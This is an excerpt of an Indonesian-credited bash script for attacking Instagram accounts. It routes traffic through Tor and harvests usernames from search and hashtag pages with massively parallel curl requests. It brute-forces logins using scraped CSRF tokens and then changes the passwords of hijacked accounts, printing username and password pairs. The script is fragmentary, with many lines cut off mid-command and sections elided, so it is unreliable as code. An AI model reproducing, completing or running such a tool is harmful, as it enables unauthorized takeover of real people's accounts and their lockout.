# !/bin/bash
# Author 		: ./NC ID
# Instagram : @rey.kunz__id
# Thanks to 		: Java Cyber Army - Bashid.org
# Recode tinggal recode aja tolol, tapi cantumin source lah tolol
# KAMU PERGI KE SURGA, AKU PERGI KE NERAKA :(
...
function ctrl_c(){
    ...
    # checking run tor
    done # checking run torcheck_tor=$(curl --socks5-hostname localhost:9050 -s "https://www.google.com" > /dev/null; echo $?)
...
\e[1;37m[\e[1;31m Contact \e[1;31m:\e[1;34m https://YouTube.com/bangpey.tv\e[1;37m ]
...
case $ask_menu in
		...
		for get_user in $(cat username.tmp); do
			get_list_user=$(curl -s "https://www.instagram.com/web/search/topsearch/?
    		done
	...
	2 ) # menu 2
		echo -ne "\n${white}[ ${red}?
		get_list_user=$(curl -sXGET "https://www.instagram.com/explore/tags/${ask_tag}/?
...
echo $tag_user | xargs -P 100 curl -s | grep -o "alternateName.
            done
wait
echo -e "${white}[ ${red}!
    ...
    csrftoken=$(curl -sL -sXGET -b Cookies_${user}.tmp --url "https://www.instagram.com" -H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" | grep -o "csrf_token.*" | cut -d '"' -f3).
    	change=$(curl -sL -sXPOST -b Cookies_${user}.tmp --url "https://www.instagram.com/accounts/password/change/" \
					...
					if [[ $change == "ok" ]]; then
						...
						echo -e " ${white} [ ${red}FAILED CHANGE PASS${white} ] ${red}-${white} @${user}${red}:${white}${ask_new_pass} ${red}-${white} Contact ${red}:${blue} https://youtube.com/bangpey.tv${white}"
...
if [[ $ask_change_pass == "Y" || $ask_change_pass == "y" ]]; then
    ...
    function brute_force(){
        	# Start brute force
        	token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.
